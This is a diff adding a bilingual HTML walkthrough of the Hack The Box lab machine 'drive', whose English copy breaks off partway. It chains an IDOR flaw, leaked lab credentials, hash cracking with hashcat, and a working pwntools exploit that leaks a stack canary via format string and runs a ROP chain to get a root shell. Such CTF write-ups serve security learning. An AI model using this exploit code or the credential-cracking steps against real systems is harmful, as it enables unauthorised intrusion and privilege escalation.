@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>drive | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">drive</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina ejecutaba un servicio web Django en el puerto 80 con una aplicación de almacenamiento de archivos. Tras enumerar las funcionalidades de la web, descubrí una vulnerabilidad IDOR que me permitió acceder a archivos de otros usuarios mediante la manipulación del endpoint <code>/block/</code>.</p>
+
+                    <p>En uno de los archivos encontré credenciales hardcodeadas que me dieron acceso SSH al usuario <code>martin</code>. Tras el acceso inicial, descubrí un servicio Gitea ejecutándose en el puerto local 3000. Mediante port forwarding con SSH, accedí a los repositorios de Git donde encontré un script de backup con credenciales en texto plano.</p>
+
+                    <p>Usando estas credenciales, descomprimí un backup de base de datos SQLite que contenía hashes de contraseñas. Después de crackear los hashes con hashcat, conseguí acceso al usuario <code>tom</code>. En el directorio home de tom encontré un binario SUID llamado <code>doodleGrive-cli</code> que era vulnerable a buffer overflow.</p>
+
+                    <p>Explotando esta vulnerabilidad mediante técnicas ROP (Return Oriented Programming), conseguí ejecutar <code>/bin/sh</code> con privilegios de root, completando así la escalada de privilegios. El exploit requirió bypassear el stack canary mediante una vulnerabilidad de format string y construir una cadena ROP para invocar <code>system("/bin/sh")</code>.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Vulnerabilidad IDOR en aplicación Django, exfiltración de credenciales mediante repositorio Gitea, cracking de hashes PBKDF2-SHA256 y SHA1, buffer overflow en binario SUID, bypass de stack canary mediante format string vulnerability, ROP chain para ejecutar shell como root.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar los servicios y puertos abiertos en la máquina objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de nmap mostrando puertos SSH (22), HTTP (80) y HTTP alternativo (3000)"></p>
+
+                <p>El escaneo revela los puertos 22 (SSH), 80 (HTTP), y 3000 (HTTP). Añado <code>drive.htb</code> al archivo <code>/etc/hosts</code> para resolver el nombre de dominio.</p>
+
+                <h3>Enumeración Web con WhatWeb</h3>
+                <p>Ejecuto <code>whatweb</code> para obtener más información sobre las tecnologías web:</p>
+                <pre><code class="language-plaintext">http://drive.htb [200 OK] Bootstrap, Cookies[csrftoken], Country[RESERVED][ZZ], Django, 
+Email[customer-support@drive.htb,support@drive.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+IP[10.10.11.235], JQuery[3.0.0], Script, Title[Doodle Grive], 
+UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], 
+X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]</code></pre>
+
+                <p>El servidor web ejecuta <code>nginx 1.18.0</code> sobre Ubuntu Linux y utiliza el framework Django. Identifico dos correos electrónicos de soporte: <code>customer-support@drive.htb</code> y <code>support@drive.htb</code>.</p>
+
+                <h3>Enumeración de Directorios</h3>
+                <p>Utilizo <code>gobuster</code> para descubrir rutas en la aplicación web:</p>
+                <p><img src="./media/image6.png" alt="Resultados de gobuster mostrando directorios y archivos encontrados en la aplicación web"></p>
+
+                <p>Las rutas descubiertas incluyen endpoints típicos de Django como <code>/register/</code>, <code>/login/</code>, y otros relacionados con la gestión de archivos.</p>
+
+                <h2>Análisis de la Aplicación Web</h2>
+                <p>Tras registrarme y explorar la aplicación, observo que se trata de un sistema de almacenamiento de archivos similar a Google Drive. Al agregar un archivo a un grupo, veo una lista de usuarios disponibles:</p>
+                <p><img src="./media/image10.png" alt="Lista de usuarios mostrando admin, martin, cris, tom y jamesMason"></p>
+
+                <p>Esto me proporciona una lista de usuarios potenciales del sistema que podré usar más adelante.</p>
+
+                <h3>Archivo de Bienvenida del Administrador</h3>
+                <p>Encuentro un archivo de bienvenida del administrador que sugiere contactar con el equipo de soporte:</p>
+                <p><img src="./media/image8.png" alt="Mensaje de bienvenida del administrador sugiriendo contactar con soporte"></p>
+
+                <p>Esta nota me hace sospechar de posibles vulnerabilidades XSS donde el administrador podría revisar los mensajes de contacto. Sin embargo, tras probar varios payloads XSS en diferentes campos de la aplicación, no consigo ningún resultado positivo.</p>
+
+                <h2>Explotación IDOR - Acceso a Archivos de Otros Usuarios</h2>
+                <p>Observo que las URLs de los archivos siguen un patrón numérico secuencial, por ejemplo: <code>http://drive.htb/112/getFileDetail/</code>. Esto sugiere una posible vulnerabilidad IDOR (Insecure Direct Object Reference).</p>
+
+                <p>Pruebo a alterar el ID del archivo en la ruta para acceder a archivos de otros usuarios:</p>
+                <p><img src="./media/image4.png" alt="Intento de acceder a archivos con diferentes IDs mostrando archivos protegidos"></p>
+
+                <p>Descubro que hay 4 archivos adicionales, pero inicialmente aparecen como protegidos al intentar acceder directamente mediante el endpoint <code>getFileDetail</code>.</p>
+
+                <h3>Bypass mediante el Endpoint /block/</h3>
+                <p>Experimentando con diferentes endpoints, descubro que mediante la ruta <code>/block/</code> sí puedo visualizar archivos de otros usuarios sin restricciones:</p>
+                <p><img src="./media/image11.png" alt="Acceso exitoso a archivos de otros usuarios mediante el endpoint block"></p>
+
+                <p>Esta vulnerabilidad IDOR me permite enumerar y leer archivos que no me pertenecen. Tras revisar varios archivos, encuentro uno particularmente interesante del administrador:</p>
+                <p><img src="./media/image9.png" alt="Archivo del administrador conteniendo credenciales en texto plano"></p>
+
+                <p>El archivo contiene credenciales hardcodeadas:</p>
+                <pre><code class="language-plaintext">martin:Xk4@KjyrYv8t194L!</code></pre>
+
+                <h3>Mensaje Adicional Relevante</h3>
+                <p>También encuentro otro mensaje que proporciona contexto adicional sobre la infraestructura:</p>
+                <p><img src="./media/image2.png" alt="Mensaje mencionando el despliegue de servicios internos y herramientas de desarrollo"></p>
+
+                <p>Este mensaje sugiere que hay servicios adicionales ejecutándose internamente que podrían ser accesibles tras ganar acceso inicial al sistema.</p>
+
+                <h2>Acceso Inicial - SSH como Martin</h2>
+                <p>Con las credenciales obtenidas, consigo acceso SSH al sistema como el usuario <code>martin</code>:</p>
+                <pre><code class="language-bash">ssh martin@drive.htb</code></pre>
+
+                <p>Una vez dentro, enumero los usuarios del sistema:</p>
+                <pre><code class="language-bash">ls -la /home</code></pre>
+                <pre><code class="language-plaintext">total 24
+drwxr-xr-x  6 root   root   4096 Dec 25  2022 .
+drwxr-xr-x 18 root   root   4096 Sep  6  2023 ..
+drwxr-x---  2 cris   cris   4096 Sep  6  2023 cris
+drwxr-x---  4 git    git    4096 Dec 25  2022 git
+drwxr-x---  5 martin martin 4096 Sep 11  2023 martin
+drwxr-x---  6 tom    tom    4096 Sep 13  2023 tom</code></pre>
+
+                <p>Identifico los usuarios <code>cris</code>, <code>git</code>, <code>martin</code>, y <code>tom</code>. El usuario <code>git</code> sugiere que podría haber un servicio Git ejecutándose en el sistema.</p>
+
+                <h2>Enumeración de Servicios Locales</h2>
+                <p>Utilizo <code>ss -tuln</code> para identificar puertos escuchando localmente:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p>Descubro que los puertos 3306 (MySQL) y 3000 están abiertos internamente. Investigando el puerto 3000 con <code>curl</code>, identifico que se trata de Gitea versión 1.17.4:</p>
+                <pre><code class="language-bash">curl http://localhost:3000</code></pre>
+
+                <h3>Port Forwarding SSH</h3>
+                <p>Para acceder cómodamente a Gitea desde mi máquina local, configuro port forwarding mediante SSH:</p>
+                <pre><code class="language-bash">ssh -L 3000:localhost:3000 martin@drive.htb</code></pre>
+
+                <p>Ahora puedo acceder a Gitea navegando a <code>http://localhost:3000</code> en mi navegador. En la interfaz de Gitea, veo varios usuarios registrados:</p>
+                <p><img src="./media/image12.png" alt="Interfaz de Gitea mostrando usuarios registrados incluyendo admin, martin, cris y tom"></p>
+
+                <h2>Exfiltración de Credenciales desde Gitea</h2>
+                <p>Utilizando las credenciales de <code>martin</code> que ya tengo, inicio sesión en Gitea y exploro sus repositorios. Encuentro un repositorio interesante llamado <code>DoodleGrive</code>:</p>
+                <p><img src="./media/image7.png" alt="Repositorio DoodleGrive en Gitea mostrando archivos de la aplicación"></p>
+
+                <p>Dentro del repositorio hay varios archivos relacionados con la aplicación web. Uno de los archivos más interesantes es <code>db_backup.sh</code>, que contiene una contraseña hardcodeada:</p>
+                <p><img src="./media/image13.png" alt="Script db_backup.sh mostrando contraseña hardcodeada en texto plano"></p>
+
+                <pre><code class="language-bash">H@ckThisP@ssW0rDIfY0uC@n:)</code></pre>
+
+                <p>Esta contraseña probablemente se utiliza para cifrar o proteger los backups de la base de datos.</p>
+
+                <h3>Extrayendo y Analizando el Backup de Base de Datos</h3>
+                <p>En el sistema, encuentro archivos de backup en una ruta específica. Utilizando <code>7z</code> y la contraseña encontrada, descomprimo el backup más reciente:</p>
+                <pre><code class="language-bash">7z x db_backup.tar.gz -pH@ckThisP@ssW0rDIfY0uC@n:)</code></pre>
+
+                <p>Dentro del backup hay una base de datos SQLite. La examino con <code>sqlite3</code> y encuentro una tabla de usuarios con hashes de contraseñas:</p>
+                <pre><code class="language-plaintext">admin:pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=
+jamesMason:pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=
+martinCruz:pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=
+tomHands:pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=
+crisDisel:pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=</code></pre>
+
+                <p>Estos hashes utilizan el algoritmo PBKDF2-SHA256, que corresponde al modo 10000 en hashcat:</p>
+                <p><img src="./media/image1.png" alt="Documentación de hashcat mostrando el modo 10000 para Django PBKDF2-SHA256"></p>
+
+                <h3>Cracking de Hashes con Hashcat</h3>
+                <p>Preparo un archivo <code>hashes.txt</code> con todos los usuarios y hashes, y ejecuto hashcat:</p>
+                <pre><code class="language-bash">hashcat -m 10000 hashes.txt /usr/share/wordlists/rockyou.txt --username</code></pre>
+
+                <p>Mientras hashcat trabaja, continúo investigando la base de datos SQLite. En la tabla <code>django_admin_log</code> veo una entrada interesante que indica que <code>tomHands</code> cambió su contraseña:</p>
+                <pre><code class="language-plaintext">141|2022-12-26 06:20:00.743182|23|tomHands|[{"changed": {"fields": ["Password"]}}]|6|16|2</code></pre>
+
+                <p>Esto sugiere que podría haber versiones antiguas de la contraseña en commits anteriores del repositorio Git.</p>
+
+                <h3>Explorando el Historial de Git</h3>
+                <p>Descargo el repositorio completo como ZIP desde Gitea y lo analizo localmente con VSCode. Explorando el historial de commits, encuentro que en una versión anterior se utilizaba un método de hashing diferente (SHA1 en lugar de PBKDF2-SHA256):</p>
+                <pre><code class="language-plaintext">jamesMason:sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
+martinCruz:sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
+tomHands:sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
+crisDisel:sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
+admin:sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3</code></pre>
+
+                <p>Los hashes SHA1 son mucho más débiles que PBKDF2-SHA256. Lanzo hashcat contra estos hashes y consigo crackear el hash de <code>tomHands</code>:</p>
+                <pre><code class="language-plaintext">sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7</code></pre>
+
+                <h2>Acceso como Usuario Tom</h2>
+                <p>Con la contraseña recuperada, consigo acceso al usuario <code>tom</code>:</p>
+                <pre><code class="language-bash">su tom
+# contraseña: johnmayer7</code></pre>
+
+                <p>En el directorio home de tom encuentro la flag de usuario y un archivo <code>README.txt</code> interesante:</p>
+                <pre><code class="language-plaintext">Hi team
+
+after the great success of DoodleGrive, we are planning now to start working on our new project: 
+"DoodleGrive self hosted", it will allow our customers to deploy their own documents sharing platform 
+privately on their servers...
+
+However in addition with the "new self Hosted release" there should be a tool(doodleGrive-cli) to help 
+the IT team in monitoring server status and fix errors that may happen.
+
+As we mentioned in the last meeting the tool still in the development phase and we should test it properly...
+
+We sent the username and the password in the email for every user to help us in testing the tool and make it better.
+
+If you face any problem, please report it to the development team.
+
+Best regards.</code></pre>
+
+                <p>El mensaje menciona una herramienta CLI llamada <code>doodleGrive-cli</code> que todavía está en desarrollo.</p>
+
+                <h3>Análisis del Binario SUID</h3>
+                <p>Encuentro un binario con permisos SUID en el directorio de tom:</p>
+                <pre><code class="language-bash">ls -la doodleGrive-cli</code></pre>
+                <pre><code class="language-plaintext">-rwSr-x--- 1 root tom 887240 Sep 13  2023 doodleGrive-cli</code></pre>
+
+                <p>El binario pertenece a <code>root</code> y tiene el bit SUID activado, lo que significa que se ejecutará con privilegios de root. Esto lo convierte en un objetivo perfecto para la escalada de privilegios.</p>
+
+                <p>Al ejecutarlo, solicita credenciales:</p>
+                <pre><code class="language-bash">./doodleGrive-cli</code></pre>
+                <pre><code class="language-plaintext">[!]Caution this tool still in the development phase...please report any issue to the development team[!]
+Enter Username:
+tom
+Enter password for tom:
+johnmayer7
+Invalid username or password.</code></pre>
+
+                <h2>Análisis del Binario con Ghidra</h2>
+                <p>Exporto el binario a mi máquina local y lo analizo con Ghidra. Tras descompilar el código, puedo buscar strings fácilmente usando VSCode. Encuentro credenciales hardcodeadas en el binario:</p>
+                <pre><code class="language-plaintext">moriarty:findMeIfY0uC@nMr.Holmz!</code></pre>
+
+                <p>Sin embargo, incluso con estas credenciales correctas, el binario no parece ofrecer funcionalidad útil para escalar privilegios directamente. Tras probar varias técnicas sin éxito, consulto recursos externos y descubro que la vía intencionada es explotar una vulnerabilidad de buffer overflow en el binario.</p>
+
+                <h2>Escalada de Privilegios - Buffer Overflow ROP</h2>
+                <p>Analizando el código descompilado en Ghidra, identifico la vulnerabilidad en la función principal:</p>
+                <pre><code class="language-c">char username_input[16];
+char password_input[56];
+long local_10;
+
+local_10 = *(long *)(in_FS_OFFSET + 0x28);
+setenv("PATH","",1);
+setuid(0);
+setgid(0);
+puts("[!]Caution this tool still in the development phase...please report any issue to the development team[!]");
+puts("Enter Username:");
+fgets(username_input, 0x10, (FILE *)stdin);
+sanitize_string(username_input);
+printf("Enter password for ");
+printf(username_input, 0x10);
+puts(":");
+fgets(password_input, 400, (FILE *)stdin);</code></pre>
+
+                <p>El problema crítico está aquí: el buffer <code>password_input</code> tiene un tamaño de 56 bytes, pero la función <code>fgets</code> lee hasta 400 bytes del input. Esto permite un buffer overflow que puedo explotar.</p>
+
+                <p>Además, hay otra vulnerabilidad: el <code>printf(username_input)</code> sin format string especificado es vulnerable a ataques de format string, lo que me permite leer valores de la memoria, incluido el stack canary.</p>
+
+                <h3>Carácteres Sanitizados</h3>
+                <p>El binario sanitiza el input eliminando ciertos carácteres tanto en username como en password:</p>
+                <pre><code class="language-c">local_29[0] = '\0';
+local_29[1] = '\n';
+local_29[2] = '\'';
+local_29[3] = ' ';
+local_29[4] = '|';
+local_29[5] = '/';
+local_29[6] = '{';
+local_29[7] = '\\';
+local_29[8] = 0x3b;</code></pre>
+
+                <p>Esto significa que no podré usar estos carácteres en mi payload, lo cual es importante tener en cuenta al construir el exploit.</p>
+
+                <h3>Protecciones del Binario</h3>
+                <p>Verifico qué protecciones de seguridad tiene el binario usando <code>checksec</code>:</p>
+                <pre><code class="language-bash">checksec --file=doodleGrive-cli</code></pre>
+                <pre><code class="language-plaintext">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1960 Symbols    No</code></pre>
+
+                <p>Las protecciones activas son:</p>
+                <ul>
+                    <li><strong>Stack Canary:</strong> Hay un canary en el stack que detecta buffer overflows</li>
+                    <li><strong>NX (No Execute):</strong> El stack no es ejecutable, impidiendo la ejecución directa de shellcode</li>
+                </ul>
+
+                <p>Las protecciones desactivadas son:</p>
+                <ul>
+                    <li><strong>PIE (Position Independent Executable):</strong> Las direcciones de memoria son fijas, lo que facilita encontrar gadgets ROP</li>
+                </ul>
+
+                <h3>Comprobación del Stack Canary</h3>
+                <p>El binario comprueba el canary al final de la función main:</p>
+                <pre><code class="language-c">puts("Invalid username or password.");
+LAB_0040231e:
+if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+    __stack_chk_fail();
+}
+return 0;</code></pre>
+
+                <p>Si el valor del canary no coincide con el valor original, el programa termina con <code>__stack_chk_fail()</code>. Por lo tanto, necesito filtrar el valor del canary para bypassear esta protección.</p>
+
+                <h3>Estrategia de Explotación</h3>
+                <p>Mi estrategia será:</p>
+                <ol>
+                    <li>Usar la vulnerabilidad de format string para filtrar el stack canary</li>
+                    <li>Construir un payload que sobrescriba el return address con una cadena ROP</li>
+                    <li>Usar gadgets ROP para ejecutar <code>system("/bin/sh")</code> con privilegios de root</li>
+                </ol>
+
+                <h3>Filtrando el Stack Canary</h3>
+                <p>Primero necesito encontrar dónde está el canary en la memoria. Uso <code>ropper</code> para buscar gadgets útiles:</p>
+                <pre><code class="language-bash">ropper --file doodleGrive-cli --string "/bin/sh"</code></pre>
+                <pre><code class="language-plaintext">Strings
+=======
+Address     Value
+-------     -----
+0x00497cd5  /bin/sh</code></pre>
+
+                <p>Perfecto, hay una string <code>/bin/sh</code> en la dirección <code>0x00497cd5</code> que puedo usar.</p>
+
+                <p>Ahora busco el gadget <code>pop rdi; ret</code> que necesito para cargar argumentos en la arquitectura x86-64:</p>
+                <pre><code class="language-bash">ropper --file doodleGrive-cli --search "pop rdi; ret"</code></pre>
+                <pre><code class="language-plaintext">[INFO] File: doodleGrive-cli
+0x0000000000401912: pop rdi; ret;</code></pre>
+
+                <p>Encuentro el gadget en <code>0x401912</code>. La dirección <code>0x401913</code> será simplemente el <code>ret</code> (útil para alinear el stack).</p>
+
+                <h3>Identificando la Posición del Canary</h3>
+                <p>Uso <code>gdb</code> para encontrar dónde se comprueba el canary y experimento con format strings para filtrarlo:</p>
+                <pre><code class="language-bash">gdb ./doodleGrive-cli</code></pre>
+                <pre><code class="language-plaintext">(gdb) break *main+314
+Breakpoint 1 at 0x402327
+(gdb) r
+Starting program: /home/asd/machines/drive/doodleGrive-cli
+[!]Caution this tool still in the development phase...please report any issue to the development team[!]
+Enter Username:
+%15$lx
+Enter password for b572293e61096b00:
+AAAA
+Invalid username or password.
+
+Breakpoint 1, 0x0000000000402327 in main ()
+(gdb) x/x $rcx
+0xb572293e61096b00: Cannot access memory at address 0xb572293e61096b00</code></pre>
+
+                <p>Enviando <code>%15$lx</code> como username, el programa devuelve <code>b572293e61096b00</code>, que es el valor del canary (reconocible por el byte nulo al final: <code>00</code>). Compruebo en el breakpoint que este valor coincide con lo que está en el registro <code>rcx</code>, confirmando que he filtrado correctamente el canary.</p>
+
+                <h3>Calculando el Offset</h3>
+                <p>Ahora necesito determinar el offset exacto donde debo colocar el canary en mi payload. Genero un patrón único con <code>msf-pattern_create</code>:</p>
+                <pre><code class="language-bash">msf-pattern_create -l 200</code></pre>
+                <pre><code class="language-plaintext">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</code></pre>
+
+                <p>Ejecuto el binario en gdb con este patrón como password:</p>
+                <pre><code class="language-plaintext">(gdb) r
+Enter Username:
+AAAA
+Enter password for AAAA:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Invalid username or password.
+
+Breakpoint 1, 0x0000000000402327 in main ()
+(gdb) x/x $rcx
+0x4130634139624138: Cannot access memory at address 0x4130634139624138</code></pre>
+
+                <p>El valor en <code>rcx</code> es <code>0x4130634139624138</code>, que forma parte de mi patrón. Calculo el offset:</p>
+                <pre><code class="language-bash">msf-pattern_offset -q 4130634139624138</code></pre>
+                <pre><code class="language-plaintext">[*] Exact match at offset 56</code></pre>
+
+                <p>El offset es exactamente 56 bytes, lo que coincide con el tamaño del buffer <code>password_input</code>.</p>
+
+                <h3>Script de Explotación</h3>
+                <p>Con toda esta información, construyo el siguiente script de Python usando <code>pwntools</code>:</p>
+                <pre><code class="language-python">from pwn import *
+
+elf = ELF("./doodleGrive-cli")
+
+# addresses
+pop_rdi = p64(0x401912)  # ropper -f ./doodleGrive-cli --search "pop rdi"
+ret = p64(0x401913)      # just return from previous
+bin_sh = p64(0x497cd5)   # strings -a -t x doodleGrive-cli | grep bin/sh
+
+if args.SSH:
+    ssh = ssh(host="drive.htb", user="tom", password="johnmayer7")
+    p = ssh.process("/home/tom/doodleGrive-cli")
+    prompt = ""
+else:
+    p = elf.process()
+    prompt = "$ "
+
+# format string vuln to leak canary
+p.readuntil(b"Enter Username:\n")
+p.sendline(b"%15$lx")
+p.readuntil(b"Enter password for ")
+leak = p.readuntil(b":\n").strip(b"\n:")
+canary = int(leak, 16)
+info(f"Leak canary: 0x{canary}")
+
+# build payload to ROP system("/bin/sh")
+payload = b"A" * 56       # offset to canary
+payload += p64(canary)    # leaked canary
+payload += b"A" * 8       # junk for stack pointer
+payload += ret            # ret for stack alignment
+payload += pop_rdi        # go to pop rdi gadget
+payload += bin_sh         # address of "/bin/sh" to pop into RDI
+payload += p64(elf.sym.system)  # return to system
+payload += p64(elf.sym.exit)    # return to exit
+
+p.sendline(payload)
+
+# clear message
+p.readuntil(b"Invalid username or password.")
+
+# reset path cleared by binary
+p.sendline(b"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")
+
+p.interactive(prompt=prompt)</code></pre>
+
+                <p>El script realiza las siguientes acciones:</p>
+                <ol>
+                    <li>Filtra el stack canary usando la vulnerabilidad de format string (<code>%15$lx</code>)</li>
+                    <li>Construye un payload con 56 bytes de relleno hasta llegar al canary</li>
+                    <li>Inserta el canary filtrado para bypassear la comprobación</li>
+                    <li>Añade 8 bytes adicionales de relleno para el saved frame pointer</li>
+                    <li>Inserta un gadget <code>ret</code> para alinear el stack (requerido en sistemas modernos)</li>
+                    <li>Construye una cadena ROP: <code>pop rdi; "/bin/sh"; system()</code></li>
+                    <li>Termina con <code>exit()</code> para una terminación limpia</li>
+                    <li>Restaura la variable PATH que el binario borra con <code>setenv("PATH","",1)</code></li>
+                </ol>
+
+                <h3>Ejecución del Exploit</h3>
+                <p>Ejecuto el script con el argumento <code>SSH</code> para explotar el binario directamente en la máquina objetivo:</p>
+                <pre><code class="language-bash">python3 bofrop.py SSH</code></pre>
+                <pre><code class="language-plaintext">[*] '/home/asd/machines/drive/doodleGrive-cli'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Connecting to drive.htb on port 22: Done
+[*] tom@drive.htb:
+    Distro    Ubuntu 20.04
+    OS:       linux
+    Arch:     amd64
+    Version:  5.4.0
+    ASLR:     Enabled
+[+] Starting remote process None on drive.htb: pid 2044
+[*] Leak canary: 0x9797313087432205056
+[*] Switching to interactive mode
+# whoami
+root
+# cat /root/root.txt
+[FLAG REDACTED]</code></pre>
+
+                <p>El exploit tiene éxito y consigo una shell como <code>root</code>, completando la escalada de privilegios y permitiéndome leer la flag de root.</p>
+            </div>
+
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Django web service on port 80 with a file storage application. After enumerating the web functionalities, I discovered an IDOR vulnerability that allowed me to access other users' files by manipulating the <code>/block/</code> endpoint.</p>
+
+                    <p>In one of the files, I found hardcoded credentials that gave me SSH access as user <code>martin</code>. After initial access, I discovered a Gitea service running on local port 3000. Through SSH port forwarding, I accessed the Git repositories where I found a backup script containing plaintext credentials.</p>
+
+                    <p>Using these credentials, I decompressed a SQLite database backup containing password hashes. After cracking the hashes with hashcat, I gained access as user <code>tom</code>. In tom's home directory, I found a SUID binary called <code>doodleGrive-cli</code> vulnerable to buffer overflow.</p>
+
+                    <p>Exploiting this vulnerability using ROP (Return Oriented Programming) techniques, I managed to execute <code>/bin/sh</code> with root privileges, completing the privilege escalation. The exploit required bypassing the stack canary through a format string vulnerability and building a ROP chain to invoke <code>system("/bin/sh")</code>.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> IDOR vulnerability in Django application, credential exfiltration through Gitea repository, PBKDF2-SHA256 and SHA1 hash cracking, buffer overflow in SUID binary, stack canary bypass via format string vulnerability, ROP chain to execute shell as root.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing SSH (22), HTTP (80), and alternative HTTP (3000) ports"></p>
+
+                <p>The scan reveals ports 22 (SSH), 80 (HTTP), and 3000 (HTTP). I add <code>drive.htb</code> to the <code>/etc/hosts</code> file to resolve the domain name.</p>
+
+                <h3>Web Enumeration with WhatWeb</h3>
+                <p>I run <code>whatweb</code> to get more information about the web technologies:</p>
+                <pre><code class="language-plaintext">http://drive.htb [200 OK] Bootstrap, Cookies[csrftoken], Country[RESERVED][ZZ], Django, 
+Email[customer-support@drive.htb,support@drive.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+IP[10.10.11.235], JQuery[3.0.0], Script, Title[Doodle Grive], 
+UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], 
+X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]</code></pre>
+
+                <p>The web server runs <code>nginx 1.18.0</code> on Ubuntu Linux and uses the Django framework. I identify two support emails: <code>customer-support@drive.htb</code> and <code>support@drive.htb</code>.</p>
+
+                <h3>Directory Enumeration</h3>
+                <p>I use <code>gobuster</code> to discover paths in the web application:</p>
+                <p><img src="./media/image6.png" alt="Gobuster results showing discovered directories and files in the web application"></p>
+
+                <p>The discovered paths include typical Django endpoints like <code>/register/</code>, <code>/login/</code>, and others related to file management.</p>
+
+                <h2>Web Application Analysis</h2>
+                <p>After registering and exploring the application, I observe it's a file storage system similar to Google Drive. When adding a file to a group, I see a list of available users:</p>
+                <p><img src="./media/image10.png" alt="User list showing admin, martin, cris, tom, and jamesMason"></p>
+
+                <p>This provides me with a list of potential system users that I can use later.</p>
+
+                <h3>Administrator Welcome File</h3>
+                <p>I find an administrator welcome file suggesting to contact the support team:</p>
+                <p><img src="./media/image8.png" alt="Administrator welcome message suggesting to contact support"></p>
+
+                <p>This note makes me suspect possible XSS vulnerabilities where the administrator might review contact messages. However, after testing several XSS payloads in different application fields, I don't get any positive results.</p>
+
+                <h2>IDOR Exploitation - Accessing Other Users' Files</h2>
+                <p>I notice that file URLs follow a sequential numeric pattern, for example: <code>http://drive.htb/112/getFileDetail/</code>. This suggests a possible IDOR (Insecure Direct Object Reference) vulnerability.</p>
+
+                <p>I try altering the file ID in the path to access other users' files:</p>
